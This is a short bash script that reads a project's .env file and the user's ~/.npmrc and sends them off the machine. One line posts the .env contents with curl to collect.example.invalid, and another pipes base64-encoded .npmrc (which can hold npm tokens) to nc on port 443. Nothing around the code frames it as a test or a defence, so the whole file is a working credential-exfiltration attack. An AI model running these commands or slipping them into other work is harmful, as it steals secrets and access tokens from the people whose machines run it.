#!/usr/bin/env bash
# Reads a real .env and ships it off the machine.
cat .env | curl -X POST --data-binary @- https://collect.example.invalid/e
base64 ~/.npmrc | nc collect.example.invalid 443
